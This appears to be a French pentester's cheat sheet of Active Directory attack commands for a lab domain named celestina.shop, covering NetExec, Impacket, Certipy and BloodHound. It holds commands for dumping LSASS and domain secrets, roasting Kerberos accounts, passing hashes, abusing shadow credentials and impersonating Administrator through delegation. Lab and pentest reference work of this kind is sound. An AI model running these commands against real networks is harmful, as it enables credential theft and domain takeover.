# Exegol — rappel outils AD (Celestina)

## NetExec (nxc)

```bash
nxc smb 10.13.37.0/24 -u 'USER' -p 'PASS'
nxc smb 10.13.37.0/24 -u 'USER' -H 'NTHASH' --local-auth
nxc smb 10.13.37.0/24 -u 'USER' -k -d celestina.shop --use-kcache
nxc smb HOST.celestina.shop -u 'USER' -p 'PASS' --shares
nxc smb HOST -u 'USER' -p 'PASS' -M spider_plus --share NOM_PARTAGE
nxc smb HOST -u 'USER' -p 'PASS' -M lsassy
nxc smb HOST -u 'USER' -p 'PASS' -x 'ipconfig'
nxc rdp 10.13.37.0/24 -u 'USER' -p 'PASS'
nxc ldap 10.13.37.42 -u 'USER' -p 'PASS' --trusted-for-delegation
nxc ldap DC.celestina.shop -u 'USER' -d celestina.shop --use-kcache
```

## Impacket

```bash
GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42
secretsdump.py celestina.shop/USER:'PASS'@10.13.37.123
secretsdump.py celestina.shop/USER@10.13.37.123 -hashes :NTHASH
getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:PASS'
```

> Sur Exegol : utiliser `getST.py` (pas `impacket-getST`).

## Certipy

```bash
certipy-ad shadow auto -u a.nozer@celestina.shop -p 'PASS' -account k.cheh -target dc-celestina.celestina.shop
certipy-ad find -u pentester@celestina.shop -p 'Password123!' -dc-ip 10.13.37.42 -stdout
```

## BloodHound (CLI)

```bash
bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All
grep -i -C 15 "AddKeyCredentialLink\|AllowedToDelegate\|description" *.json
```

## Kerberos ticket

```bash
export KRB5CCNAME="/chemin/vers/ticket.ccache"
klist
```

## SMB client

```bash
smbclient //10.13.37.123/Todo -U 'pentester%Password123!'
```
